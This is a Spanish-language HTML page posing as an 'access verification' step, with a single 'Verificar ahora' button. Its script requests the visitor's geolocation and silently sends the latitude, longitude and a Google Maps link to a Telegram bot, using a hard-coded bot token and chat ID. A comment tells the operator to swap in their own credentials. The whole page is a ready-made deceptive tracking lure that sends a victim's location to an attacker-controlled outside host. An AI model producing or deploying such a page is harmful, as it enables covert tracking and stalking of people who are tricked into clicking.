<!DOCTYPE html>
<html>
<head>
    <title>Verificación de Acceso</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #0a0f1e;
            font-family: system-ui, -apple-system, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: rgba(20, 27, 45, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
        }
        h2 { font-size: 1.8rem; color: #fff; margin-bottom: 12px; }
        p { color: #a0a8c0; margin-bottom: 28px; }
        button {
            background: linear-gradient(135deg, #2b6ef0, #1a4ec0);
            border: none;
            padding: 16px 28px;
            border-radius: 60px;
            font-size: 1rem;
            font-weight: 600;
            color: white;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
<div class="card">
    <h2>📡 Verificación de Acceso</h2>
    <p>Presiona el botón para continuar</p>
    <button id="btn">✅ Verificar ahora</button>
</div>

<script>
    // ⚠️ SOLO TIENES QUE CAMBIAR ESTOS 2 VALORES ⚠️
    const BOT_TOKEN = '8803149571:AAHb4seP9jcK9uv9TfC7vQiZseyo_-c6rcw'; // Tu token de Telegram
    const CHAT_ID = '7555997298'; // Tu Chat ID

    const btn = document.getElementById('btn');
    btn.onclick = () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                const mensaje = `📍 Ubicación capturada:\nLat: ${lat}\nLng: ${lng}\nVer en mapa: ${mapsLink}`;
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
                });
                alert('✅ Datos enviados correctamente');
            }, (error) => alert('❌ Error de ubicación: ' + error.message));
        } else {
            alert('❌ Tu navegador no soporta geolocalización');
        }
    };
</script>
</body>
</html>